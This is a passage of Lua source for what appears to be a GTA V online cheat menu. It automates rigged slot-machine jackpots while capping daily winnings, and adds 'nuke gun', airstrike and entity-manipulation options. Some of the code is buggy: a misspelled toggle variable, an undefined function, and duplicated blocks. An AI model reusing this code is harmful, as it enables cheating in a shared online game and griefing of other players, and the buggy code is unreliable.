function get_safe_playtime()
    local first_spin = find_earliest_rigged_spin()
    if first_spin == nil then return "00:00" end
    local countdown = first_spin.time - util.current_time_millis() + config.millis_in_day
    if countdown > 0 then
        return disp_time(countdown / 1000)
    else
        return "00:00"
    end
end
function is_num_daily_wins_exceeded()
    return get_daily_winnings() >= config.max_daily_winnings
end
function switch_rigged_state()
    if state.is_rigged == nil or state.is_rigged == true then
        state.is_rigged = false
    else
        state.is_rigged = true
    end
end
function exit_slots()
    debug_log("Exiting slots")
    menu.trigger_commands("rigslotmachines off")
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 202, 1)
    wait(config.delay_between_button_press)
end
function is_slots_ready_for_spin()
    if not is_player_in_casino(players.user()) then
        gtoast("您必须在赌场中并坐在高支出的老虎机上才能启动自动旋转")
        exit_slots()
        return false
    end
    if not is_player_at_any_slot_machine() then
        gtoast("您必须坐在高支出老虎机（“钻石矿工”或“太阳的迪蒂”）上才能启动自动旋转")
        exit_slots()
        return false
    end
    if is_num_daily_wins_exceeded() then
        gtoast("您已经赢得了每日限额。在 "..get_safe_playtime())
        exit_slots()
        return false
    end
    return true
end
function spin_slots()
    if not is_slots_ready_for_spin() then
        debug_log("Slot machine not ready for spinning")
        return
    end
    switch_rigged_state()
    if state.is_rigged then
        debug_log("Setting slots to win")
        gtoast("Spinning slots to win")
        if config.test_mode then
            menu.trigger_command(commands.rigslotmachines, "smallwin")
        else
            menu.trigger_command(commands.rigslotmachines, "jackpot")
        end
        state.has_chips = true
    else
        debug_log("Setting slots to lose")
        gtoast("Spinning slots to lose")
        menu.trigger_command(commands.rigslotmachines, "loss")
    end
    wait(config.delay_between_button_press)
    local previous_chip_count = get_chip_count()
    -- Set Bet Amount
    debug_log("Setting bet amount")
    if state.is_rigged then
        --gtoast("Max bet")
        press_button(204)   -- TAB for Max Bet
    else
        --gtoast("Min bet")
        press_button(204)   -- TAB for Max Bet
        wait(config.delay_between_button_press * 2)
        press_button(203)   -- Space to cycle to lowest bet
    end
    wait(config.delay_between_button_press)
    -- Spin
    debug_log("Spinning slot")
    press_button(201)
    wait(config.delay_between_button_press)
    debug_log("Setting slots to unrigged")
    menu.trigger_command(commands.rigslotmachines, "off")
    wait(config.delay_between_spins - 500)
    local spin_winnings = get_chip_count() - previous_chip_count
    debug_log("Chip change "..tostring(spin_winnings))
    log_spin(state.is_rigged, spin_winnings)
    refresh_daily_winnings()
    refresh_next_spin_time()
end
function entity_control_ped(menu_parent, ped)
    menu.divider(menu_parent, "Ped")
    menu.action(menu_parent, "传送到我的载具", {}, "", function()
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        if vehicle then
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(vehicle) then
                PED.SET_PED_INTO_VEHICLE(ped, vehicle, -2)
            end
        end
    end)
    menu.action(menu_parent, "移除全部武器", {}, "", function()
        WEAPON.REMOVE_ALL_PED_WEAPONS(ped)
    end)
    menu.action_slider(menu_parent, "给予武器", {}, "", weapon_list, function(value)
        local weaponHash = util.joaat(weapon_list_model[value])
        WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, false, true)
        WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    end)
    menu.action(menu_parent, "一键无敌强化NPC", {}, "适用于友方NPC", function()
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_PROOFS(ped, true, true, true, true, true, true, true, true)
        PED.SET_PED_CAN_RAGDOLL(ped, false)
        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000.0)
        PED.SET_PED_ACCURACY(ped, 100.0)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) --AlwaysFight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 12, true) --BlindFireWhenInCover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true) --PerfectAccuracy
        PED.SET_PED_COMBAT_MOVEMENT(ped, 2)
        PED.SET_PED_COMBAT_ABILITY(ped, 2)
        PED.SET_PED_COMBAT_RANGE(ped, 2)
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1)
        PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
        gtoast("Done")
    end)
end
--- VEHICLE entity type functions ---
function entity_control_vehicle(menu_parent, vehicle)
    menu.divider(menu_parent, "Vehicle")
    menu.action(menu_parent, "踢出载具内NPC", {}, "", function()
        local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vehicle)
        for k = -1, seats do
            local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, k)
            if ped > 0 then
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, KNOCKOFFVEHICLE_EASY)
                PED.KNOCK_PED_OFF_VEHICLE(ped)
            end
        end
    end)
    menu.action(menu_parent, "拆下车门", {}, "", function()
        for i = 0, 3 do
            VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
        end
    end)
    menu.toggle(menu_parent, "车门开关", {}, "", function(toggle)
        if toggle then
            for i = 0, 3 do
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, false)
            end
        else
            VEHICLE.SET_VEHICLE_DOORS_SHUT(vehicle, false)
        end
    end)
    menu.toggle(menu_parent, "车门锁", {}, "", function(toggle)
        if toggle then
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 2)
        else
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
        end
    end)
    menu.click_slider(menu_parent, "向前的速度", { "control_veh_forward_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, value)
    end)
    menu.action(menu_parent, "修复载具", {}, "", function()
        VEHICLE.SET_VEHICLE_FIXED(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
    end)
end
-- 所有控制的实体
control_ent_list = {}
-- 所有控制实体的menu.list
control_ent_menu_list = {}
--返回瞄准的实体
GetEntity_PlayerIsAimingAt = function(p)
    local ent = NULL
    if PLAYER.IS_PLAYER_FREE_AIMING(p) then
        local ptr = memory.alloc_int()
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(p, ptr) then
            ent = memory.read_int(ptr)
        end
        memory.free(ptr)
        if ENTITY.IS_ENTITY_A_PED(ent) and PED.IS_PED_IN_ANY_VEHICLE(ent) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            ent = vehicle
        end
    end
    return ent
end
-- 遍历数组 判断某值是否在表中
function isInTable(tbl, value)
    for k, v in pairs(tbl) do
        if v == value then
            return true
        end
    end
    return false
end
-- 根据值清空对应的元素（非删除操作）
function clearTableValue(tbl, value)
    for k, v in pairs(tbl) do
        if v == value then
            tbl[k] = nil
        end
    end
end
---@return table
function newTableValue(pos, value)
    local tbl = {}
    tbl[pos] = value
    return tbl
end
function entitycontrol()
    local ent = GetEntity_PlayerIsAimingAt(players.user())
    if ent ~= NULL and ENTITY.DOES_ENTITY_EXIST(ent) then
        if not isInTable(control_ent_list, ent) then
            table.insert(control_ent_list, ent)
            ---
            local modelHash = ENTITY.GET_ENTITY_MODEL(ent)
            local entity_types = { "No entity", "Ped", "Vehicle", "Object" }
            local entity_type = entity_types[ENTITY.GET_ENTITY_TYPE(ent) + 1]
            if ENTITY.GET_ENTITY_TYPE(ent) == 3 then
                if OBJECT.IS_OBJECT_A_PICKUP(ent) or OBJECT.IS_OBJECT_A_PORTABLE_PICKUP(ent) then
                    entity_type = "Pickup"
                end
            end
            local entity_info = "Hash: " .. modelHash .. " (" .. entity_type .. ")"
            gtoast(entity_info)
            ---
            menu_control_entity = menu.list(entity_control, entity_info, {}, "")
            entity_control_all(menu_control_entity, ent)
            -- ped
            if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
                entity_control_ped(menu_control_entity, ent)
            end
            -- vehicle
            if ENTITY.GET_ENTITY_TYPE(ent) == 2 then
                entity_control_vehicle(menu_control_entity, ent)
            end
            table.insert(control_ent_menu_list, menu_control_entity)
        end
    end
end
function clearcontrollog()
    for k, v in pairs(control_ent_menu_list) do
        if v ~= nil then
            menu.delete(v)
        end
    end
    -- 所有控制的实体
    control_ent_list = {}
    -- 所有控制实体的menu.list
    control_ent_menu_list = {}
end
-------  -------
local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)
    return destination
end
function hud_gameplay_cam(distance)
    local result = {}
    local didHit = memory.alloc(1)
    local endCoords = v3()
    local surfaceNormal = v3()
    local hitEntity = memory.alloc_int()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)
    local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(cam_pos.x, cam_pos.y, cam_pos.z, destination.x, destination.y, destination.z, -1, players.user_ped(), 4)
    SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, memory.addrof(endCoords), memory.addrof(surfaceNormal), hitEntity)
    result.didHit = memory.read_byte(didHit) ~= 0
    result.endCoords = endCoords
    result.surfaceNormal = surfaceNormal
    result.hitEntity = memory.read_int(hitEntity)
    return result
end
local function direction(offset)
    local c1 = get_offset_from_gameplay_camera(offset or 5)
    local res = raycast_gameplay_cam(1000)
    local c2
    if res.didHit then
        c2 = res.endCoords
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2:sub(c1)
    c2:mul(1000)
    return c2, c1
end
local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end
local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY._GET_ENTITY_BONE_POSITION_2(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    wait()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end
    local function pairsByKeys(t, f)
        local a = {}
        for n in pairs(t) do table.insert(a, n) end
        table.sort(a, f)
        local i = 0
        local iter = function()
            i += 1
            if a[i] == nil then return nil
            else return a[i], t[a[i]]
            end
        end
        return iter
    end
function getLabelTableFromKeys(keyTable)
    local labelTable = {}
    for k, v in pairsByKeys(keyTable) do
        table.insert(labelTable, {k})
    end
    return labelTable
end
function bulletset(text)
    launcherThrowable = throwablesTable[text]
end
function menu.mutually_exclusive_toggle(root, name, commands, help, exclusive_toggles, func)
    local this_toggle
    this_toggle = menu.toggle(root, name, commands, help, function(toggle)
        if toggle then
            for _, ref in pairs(exclusive_toggles) do
                if ref != this_toggle and menu.get_value(ref) then
                    menu.set_value(ref, false)
                end
            end
        end
        func(toggle)
    end)
    return this_toggle
end
local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        wait(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end
mutually_exclusive_weapons  = {}
local nuke_gun_option
function nukegunmode(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1074790547 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1074790547)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
local nuke_gun_option
function nukegunmode1(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1853920116 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1853920116)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function nukegunmode2(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1312131151)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function nukegunmode3(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1716589765 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1716589765)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function nukegunmode4(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 1593441988 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(1593441988)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function nukegunmode5(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 727643628 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(727643628)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function nukegunmode6(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 453432689 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(453432689)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()
                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
function request_ptfx_load(hash)
    request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(hash)
    while not STREAMING.HAS_PTFX_ASSET_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
function get_waypoint_v3()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
        local tries = 0
        while not success or tries <= 100 do
            success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            tries += 1
            wait()
        end
        if success then
            waypoint_pos.z = Zcoord
        end
        return waypoint_pos
    else
        gtoast("请在地图上标点，谢谢")
    end
end
--[[
object = 0
local format0 = "按 W A S D 来使用地毯式骑行"
local format1 = "按 Shift 以移动得更快"
function carpetridexx()
    if state == 0 then
		local objHash = util.joaat("p_cs_beachtowel_01_s")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			wait()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(
			localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, false
		)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)
		TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        notification(format0 .. ".\n" .. format1 .. '.', HudColour.black,
        "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY", "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
		state = 1
	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end]]
--定点轰炸
function lhbj()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)
        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            wait()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end
function executeNuke(pos)
    for a = 0, 100, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
        wait(50)
    end
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
end
function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    wait()
    end
end
function chibangnie(on_toggle)
if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				wait()
			end
			end
end
function kxq()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0
		)
	end
end
function nukepoint()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)
        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            wait()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end
nuke_height = 40
function nukeheight(value)
    nuke_height = value
end
local disable_firing = false
local function disableFiringLoop()
    util.create_tick_handler(function()
        PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)
        return disable_firing
    end)
end
local exp_animal = 'a_c_killerwhale'
local explosive_animal_gun
function expaniamlgun(toggle)
    explosive_animal_gun = toggle
    while explosive_animal_gun do
        local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
        local weaponType = WEAPON.GET_WEAPON_DAMAGE_TYPE(weaponHash)
        if weaponType == 3 or (weaponType == 5 and WEAPON.GET_WEAPONTYPE_GROUP(weaponHash) != 1548507267) then --weapons that shoot bullets or explosions and isn't in the throwables category (grenades, proximity mines etc...)
            disable_firing = true
            disableFiringLoop()
            if K.is_disabled_control_pressed(2, 'INPUT_ATTACK') and PLAYER.IS_PLAYER_FREE_AIMING(players.user_ped()) then
                util.create_thread(function()
                    local hash = util.joaat(exp_animal)
                    loadModel(hash)
                    local dir, c1 = direction()
                    local animal = entities.create_ped(28, hash, c1, 0)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    ENTITY.APPLY_FORCE_TO_ENTITY(animal, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
